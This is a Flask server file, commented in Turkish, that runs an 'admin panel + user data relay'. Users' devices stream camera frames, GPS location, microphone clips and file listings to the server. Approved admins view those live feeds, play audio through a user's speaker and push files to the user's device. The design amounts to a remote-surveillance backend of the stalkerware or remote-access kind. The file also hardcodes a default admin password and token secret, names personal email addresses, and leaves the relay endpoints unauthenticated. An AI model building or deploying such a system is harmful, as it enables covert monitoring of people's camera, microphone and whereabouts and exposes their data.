"""Flask web sunucusu — cloud modda çalışır.
   Admin panel + kullanıcı veri relay sistemi."""
import os
import time
import uuid
import hashlib
import hmac
import json
import base64
import threading
from flask import Flask, jsonify, request, render_template
from google.oauth2 import id_token as google_id_token
from google.auth.transport import requests as google_requests

IS_CLOUD = os.environ.get("DEPLOY_MODE") == "cloud"

app = Flask(__name__, template_folder="../templates", static_folder="../static")

# ==================== KONFİGÜRASYON ====================

ADMIN_PASSWORD = os.environ.get("ADMIN_PASSWORD", "Ag1453ag!")
ADMIN_PASSWORD_HASH = hashlib.sha256(ADMIN_PASSWORD.encode()).hexdigest()
GOOGLE_CLIENT_ID = "126230861809-7tlgq66d7jg8b2ljcnkt30qucd61qkt7.apps.googleusercontent.com"
APPROVED_ADMIN_EMAILS = [
    "aydannadya31@gmail.com",
    "infobilgi42@gmail.com",
    "alpgube@gmail.com",
    "alpgube7@gmail.com",
]
ADMIN_TOKEN_SECRET = os.environ.get("ADMIN_TOKEN_SECRET", "guvenli-takip-hmac-secret-2024")

# Bellek içi veri depoları
users_online = {}       # uid -> {email, name, photo_url, last_heartbeat, permissions: {...}}
relay_data = {}         # uid -> {camera: {...}, location: {...}, audio: {...}, storage: {...}, files: [...]}
relay_lock = threading.Lock()

# ==================== YARDIMCI ====================

def make_session_token():
    return uuid.uuid4().hex + uuid.uuid4().hex


def clean_stale_users():
    """30 saniyedir heartbeat göndermeyen kullanıcıları temizle."""
    now = time.time()
    with relay_lock:
        stale = [uid for uid, info in users_online.items()
                 if now - info.get("last_heartbeat", 0) > 30]
        for uid in stale:
            users_online.pop(uid, None)
            relay_data.pop(uid, None)


# ==================== ADMIN TOKEN (HMAC — server-state gerekmez) ====================

def make_admin_token(email, name, photo_url=""):
    payload = base64.urlsafe_b64encode(
        json.dumps({"email": email, "name": name, "photo_url": photo_url, "time": time.time()}).encode()
    ).decode().rstrip("=")
    sig = hmac.new(ADMIN_TOKEN_SECRET.encode(), payload.encode(), hashlib.sha256).hexdigest()
    return payload + "." + sig


def verify_admin_token(token):
    try:
        parts = token.split(".")
        if len(parts) != 2:
            return None
        payload, sig = parts
        expected = hmac.new(ADMIN_TOKEN_SECRET.encode(), payload.encode(), hashlib.sha256).hexdigest()
        if not hmac.compare_digest(sig, expected):
            return None
        # padding ekle (base64 decode için)
        padded = payload + "=" * (4 - len(payload) % 4) if len(payload) % 4 else payload
        data = json.loads(base64.urlsafe_b64decode(padded.encode()).decode())
        # 1 saat timeout
        if time.time() - data["time"] > 3600:
            return None
        return data
    except Exception:
        return None


def require_admin(request):
    """Admin session token'ını doğrula."""
    token = request.headers.get("X-Admin-Token", "")
    session = verify_admin_token(token)
    if not session:
        return None
    return session


# ==================== ANA SAYFALAR ====================

@app.route("/")
def index():
    return render_template("login.html")


@app.route("/login")
def login_page():
    return render_template("login.html")


@app.route("/app")
def app_page():
    return render_template("index.html")


@app.route("/admin")
def admin_page():
    return render_template("admin.html")


# ==================== AUTH ENDPOINT'LERİ ====================

@app.route("/api/auth/admin-check", methods=["POST"])
def api_admin_check():
    """Admin şifresini doğrula (ilk aşama)."""
    data = request.get_json() or {}
    given = data.get("password", "")
    given_hash = hashlib.sha256(given.encode()).hexdigest()
    if given_hash == ADMIN_PASSWORD_HASH:
        return jsonify({"status": "ok"})
    return jsonify({"status": "error", "error": "Hatalı şifre"}), 401


@app.route("/api/auth/admin-google-verify", methods=["POST"])
def api_admin_google_verify():
    """Google ID token'ını doğrula, email'i kontrol et, admin session'ı oluştur."""
    data = request.get_json() or {}
    id_token_str = data.get("idToken", "")

    if not id_token_str:
        return jsonify({"status": "error", "error": "Token gerekli"}), 400

    try:
        info = google_id_token.verify_oauth2_token(
            id_token_str, google_requests.Request(), GOOGLE_CLIENT_ID
        )
        email = info.get("email", "").lower().strip()
        name = info.get("name", email.split("@")[0])
        photo = info.get("picture", "")

        if email not in [e.lower().strip() for e in APPROVED_ADMIN_EMAILS]:
            return jsonify({
                "status": "error",
                "error": "Bu email adresi admin yetkisine sahip değil"
            }), 403

        token = make_admin_token(email, name, photo)

        return jsonify({
            "status": "ok",
            "token": token,
            "email": email,
            "name": name,
            "photo_url": photo,
        })

    except Exception as e:
        return jsonify({"status": "error", "error": f"Token doğrulama hatası: {str(e)}"}), 401


# ==================== RELAY — KULLANICI VERİ GÖNDERME ====================

@app.route("/api/relay/heartbeat", methods=["POST"])
def api_relay_heartbeat():
    """Kullanıcıdan heartbeat + izin durumu."""
    data = request.get_json() or {}
    uid = data.get("uid", "")
    email = data.get("email", "")
    name = data.get("name", "")
    photo = data.get("photo_url", "")
    permissions = data.get("permissions", {})

    if not uid:
        return jsonify({"status": "error", "error": "uid gerekli"}), 400

    with relay_lock:
        if uid not in users_online:
            users_online[uid] = {"email": email, "name": name, "photo_url": photo}
        users_online[uid]["last_heartbeat"] = time.time()
        users_online[uid]["permissions"] = permissions

    clean_stale_users()
    return jsonify({"status": "ok"})


@app.route("/api/relay/camera", methods=["POST"])
def api_relay_camera():
    """Kullanıcıdan kamera karesi."""
    data = request.get_json() or {}
    uid = data.get("uid", "")
    frame = data.get("frame", "")
    camera_index = data.get("camera_index", 0)
    if not uid:
        return jsonify({"status": "error"}), 400
    with relay_lock:
        if uid not in relay_data:
            relay_data[uid] = {}
        relay_data[uid]["camera"] = {
            "frame": frame,
            "camera_index": camera_index,
            "timestamp": time.time(),
        }
    return jsonify({"status": "ok"})


@app.route("/api/relay/location", methods=["POST"])
def api_relay_location():
    """Kullanıcıdan konum."""
    data = request.get_json() or {}
    uid = data.get("uid", "")
    if not uid or "latitude" not in data:
        return jsonify({"status": "error"}), 400
    with relay_lock:
        if uid not in relay_data:
            relay_data[uid] = {}
        relay_data[uid]["location"] = {
            "latitude": data["latitude"],
            "longitude": data["longitude"],
            "accuracy": data.get("accuracy", 0),
            "altitude": data.get("altitude", 0),
            "timestamp": time.time(),
        }
    return jsonify({"status": "ok"})


@app.route("/api/relay/audio", methods=["POST"])
def api_relay_audio():
    """Kullanıcıdan ses seviyesi / clip."""
    data = request.get_json() or {}
    uid = data.get("uid", "")
    if not uid:
        return jsonify({"status": "error"}), 400
    with relay_lock:
        if uid not in relay_data:
            relay_data[uid] = {}
        relay_data[uid]["audio"] = {
            "level": data.get("level", 0),
            "has_signal": data.get("has_signal", False),
            "clip": data.get("clip", ""),  # base64 ses clip
            "timestamp": time.time(),
        }
    return jsonify({"status": "ok"})


@app.route("/api/relay/storage", methods=["POST"])
def api_relay_storage():
    """Kullanıcıdan depolama bilgisi."""
    data = request.get_json() or {}
    uid = data.get("uid", "")
    if not uid:
        return jsonify({"status": "error"}), 400
    with relay_lock:
        if uid not in relay_data:
            relay_data[uid] = {}
        relay_data[uid]["storage"] = {
            "quota": data.get("quota", ""),
            "usage": data.get("usage", ""),
            "usage_percent": data.get("usage_percent", 0),
            "files": data.get("files", []),
            "timestamp": time.time(),
        }
    return jsonify({"status": "ok"})


# ==================== ADMIN — KULLANICI VERİSİNİ ÇEKME ====================

@app.route("/api/admin/users")
def api_admin_users():
    """Admin için çevrimiçi kullanıcı listesi."""
    session = require_admin(request)
    if not session:
        return jsonify({"status": "error", "error": "Yetkisiz"}), 401

    clean_stale_users()
    now = time.time()
    user_list = []
    with relay_lock:
        for uid, info in users_online.items():
            is_active = (now - info.get("last_heartbeat", 0)) < 15
            user_list.append({
                "uid": uid,
                "email": info.get("email", ""),
                "name": info.get("name", ""),
                "photo_url": info.get("photo_url", ""),
                "is_active": is_active,
                "permissions": info.get("permissions", {}),
                "last_seen": info.get("last_heartbeat", 0),
            })
    return jsonify({"status": "ok", "users": user_list, "admin": session})


@app.route("/api/admin/user/<uid>")
def api_admin_user(uid):
    """Admin için tek kullanıcının relay verisi."""
    session = require_admin(request)
    if not session:
        return jsonify({"status": "error", "error": "Yetkisiz"}), 401

    clean_stale_users()
    with relay_lock:
        user_info = users_online.get(uid)
        data = relay_data.get(uid, {})
        is_active = user_info and (time.time() - user_info.get("last_heartbeat", 0)) < 15

    return jsonify({
        "status": "ok",
        "user": user_info,
        "relay": {
            "camera": data.get("camera"),
            "location": data.get("location"),
            "audio": data.get("audio"),
            "storage": data.get("storage"),
            "files": data.get("files", []),
        },
        "is_active": bool(is_active),
    })


# ==================== ADMIN — DOSYA / SES GÖNDERME ====================

@app.route("/api/admin/send-audio", methods=["POST"])
def api_admin_send_audio():
    """Admin, kullanıcının hoparlörüne ses göndermek için buffer'a yazar."""
    session = require_admin(request)
    if not session:
        return jsonify({"status": "error"}), 401
    data = request.get_json() or {}
    uid = data.get("uid", "")
    audio_base64 = data.get("audio", "")
    if not uid or not audio_base64:
        return jsonify({"status": "error", "error": "uid ve audio gerekli"}), 400
    with relay_lock:
        if uid not in relay_data:
            relay_data[uid] = {}
        relay_data[uid]["admin_audio"] = {
            "audio": audio_base64,
            "timestamp": time.time(),
        }
    return jsonify({"status": "ok"})


@app.route("/api/relay/check-audio")
def api_relay_check_audio():
    """Kullanıcı admin'den gelen sesi kontrol eder."""
    uid = request.args.get("uid", "")
    with relay_lock:
        data = relay_data.get(uid, {}).get("admin_audio")
        if data and time.time() - data.get("timestamp", 0) < 5:
            return jsonify({"status": "ok", "audio": data["audio"]})
    return jsonify({"status": "ok", "audio": ""})


# ==================== ADMIN — DOSYA TRANSFERİ ====================

@app.route("/api/admin/transfer/upload", methods=["POST"])
def api_admin_transfer_upload():
    """Admin kullanıcıya dosya yükler."""
    session = require_admin(request)
    if not session:
        return jsonify({"status": "error"}), 401
    data = request.get_json() or {}
    uid = data.get("uid", "")
    filename = data.get("filename", "dosya")
    content = data.get("content", "")  # base64

    if not uid or not content:
        return jsonify({"status": "error"}), 400

    with relay_lock:
        if uid not in relay_data:
            relay_data[uid] = {}
        if "files" not in relay_data[uid]:
            relay_data[uid]["files"] = []
        relay_data[uid]["files"].append({
            "filename": filename,
            "content": content,
            "timestamp": time.time(),
            "from_admin": session.get("email", ""),
        })

    return jsonify({"status": "ok", "message": f"{filename} kullanıcıya iletildi"})


@app.route("/api/relay/check-files")
def api_relay_check_files():
    """Kullanıcı kendisine gönderilen dosyaları kontrol eder."""
    uid = request.args.get("uid", "")
    with relay_lock:
        files = relay_data.get(uid, {}).get("files", [])
        recent = [f for f in files
                  if time.time() - f.get("timestamp", 0) < 60 and not f.get("downloaded")]
        for f in recent:
            f["downloaded"] = True
    return jsonify({"status": "ok", "files": recent})


# ==================== PERMISSIONS (mevcut) ====================

from . import permissions as perms_mod

@app.route("/api/permissions")
def api_permissions():
    return jsonify({"permissions": perms_mod.get_all_permissions()})

@app.route("/api/permissions/grant", methods=["POST"])
def api_grant_permission():
    data = request.get_json()
    key = data.get("key")
    if key not in perms_mod.PERMISSION_DEFINITIONS:
        return jsonify({"error": "Geçersiz izin"}), 400
    perms_mod.grant(key)
    return jsonify({"status": "ok", "key": key, "granted": True})

@app.route("/api/permissions/revoke", methods=["POST"])
def api_revoke_permission():
    data = request.get_json()
    key = data.get("key")
    if key not in perms_mod.PERMISSION_DEFINITIONS:
        return jsonify({"error": "Geçersiz izin"}), 400
    perms_mod.revoke(key)
    return jsonify({"status": "ok", "key": key, "granted": False})

@app.route("/api/permissions/revoke-all", methods=["POST"])
def api_revoke_all():
    perms_mod.revoke_all()
    return jsonify({"status": "ok"})


# ==================== IP KONUM API ====================

@app.route("/api/ip-location")
def api_ip_location():
    try:
        import requests as http_req
        if IS_CLOUD:
            client_ip = request.headers.get("X-Forwarded-For", "").split(",")[0].strip()
        else:
            client_ip = request.remote_addr or "8.8.8.8"
        if not client_ip or client_ip in ("127.0.0.1", "::1", ""):
            ip_resp = http_req.get("https://api.ipify.org?format=json", timeout=5)
            client_ip = ip_resp.json().get("ip", "8.8.8.8")
        resp = http_req.get(
            f"http://ip-api.com/json/{client_ip}?fields=status,country,countryCode,region,city,zip,lat,lon,isp,timezone,query,org",
            timeout=5
        )
        data = resp.json()
        if data.get("status") != "success":
            return jsonify({"status": "error", "error": "Konum bilgisi alınamadı"})
        return jsonify({"status": "ok", "source": "ip", "ip": data.get("query"),
            "country": data.get("country"), "country_code": data.get("countryCode"),
            "region": data.get("region"), "city": data.get("city"),
            "postal": data.get("zip"), "latitude": data.get("lat"),
            "longitude": data.get("lon"), "isp": data.get("isp"),
            "org": data.get("org"), "timezone": data.get("timezone"),})
    except Exception as e:
        return jsonify({"status": "error", "error": str(e)})


# ==================== SADECE LOKAL MOD — DONANIM API'LERİ ====================

@app.route("/api/scan/camera")
def api_scan_camera():
    if IS_CLOUD:
        return jsonify({"status": "cloud", "message": "Kamera erişimi için tarayıcı izni gerekiyor"})
    from .modules import camera
    result = camera.scan_cameras()
    if "error" in result:
        return jsonify(result), 403 if result.get("status") == "blocked" else 500
    return jsonify(result)

@app.route("/api/scan/camera/capture")
def api_capture_camera():
    if IS_CLOUD:
        return jsonify({"status": "cloud", "message": "Görüntü yakalama için tarayıcı API'leri kullanılıyor"})
    from .modules import camera
    camera_id = request.args.get("id", 0)
    result = camera.capture_frame(camera_id)
    if "error" in result:
        return jsonify(result), 403 if "izin" in result.get("error", "") else 500
    return jsonify(result)

@app.route("/api/scan/audio")
def api_scan_audio():
    if IS_CLOUD:
        return jsonify({"status": "cloud", "message": "Ses erişimi için tarayıcı izni gerekiyor"})
    from .modules import audio
    result = audio.scan_audio()
    if "error" in result:
        return jsonify(result), 403 if result.get("status") == "blocked" else 500
    return jsonify(result)

@app.route("/api/scan/audio/record")
def api_record_audio():
    if IS_CLOUD:
        return jsonify({"status": "cloud", "message": "Ses kaydı için tarayıcı API'leri kullanılıyor"})
    from .modules import audio
    duration = request.args.get("duration", 2, type=int)
    duration = min(max(duration, 1), 5)
    result = audio.record_mic(duration=duration)
    if "error" in result:
        return jsonify(result), 403 if "izin" in result.get("error", "") else 500
    return jsonify(result)

@app.route("/api/scan/audio/test-speaker")
def api_test_speaker():
    if IS_CLOUD:
        return jsonify({"status": "cloud", "message": "Hoparlör testi için tarayıcı API'leri kullanılıyor"})
    from .modules import audio
    result = audio.test_speaker()
    if "error" in result:
        return jsonify(result), 403 if "izin" in result.get("error", "") else 500
    return jsonify(result)

@app.route("/api/scan/location")
def api_location():
    if IS_CLOUD:
        return jsonify({"status": "cloud", "message": "GPS konumu için tarayıcı Geolocation API kullanılıyor"})
    from .modules import location as loc_module
    result = loc_module.get_location()
    if "error" in result:
        return jsonify(result), 403 if result.get("status") == "blocked" else 500
    return jsonify(result)

@app.route("/api/scan/storage")
def api_storage():
    if IS_CLOUD:
        return jsonify({"status": "cloud", "message": "Depolama bilgisi için tarayıcı Storage API kullanılıyor"})
    from .modules import storage
    result = storage.get_storage_summary()
    return jsonify(result)

@app.route("/api/scan/all")
def api_scan_all():
    results = {}
    if IS_CLOUD:
        results["camera"] = {"status": "cloud"}
        results["audio"] = {"status": "cloud"}
        results["location"] = {"status": "cloud"}
        results["storage"] = {"status": "cloud"}
        results["system"] = {"status": "ok", "version": "1.0", "mode": "cloud"}
    else:
        perms = perms_mod.load_permissions()
        from .modules import camera, audio, location as loc_module, storage
        if perms.get("camera"):
            results["camera"] = camera.scan_cameras()
        else:
            results["camera"] = {"status": "blocked"}
        if perms.get("microphone") or perms.get("speaker"):
            results["audio"] = audio.scan_audio()
        else:
            results["audio"] = {"status": "blocked"}
        if perms.get("location"):
            results["location"] = loc_module.get_location()
        else:
            results["location"] = {"status": "blocked"}
        if perms.get("storage"):
            results["storage"] = storage.get_disk_info()
        else:
            results["storage"] = {"status": "blocked"}
        results["system"] = storage.get_system_info()
    results["permissions"] = perms_mod.get_all_permissions()
    return jsonify(results)
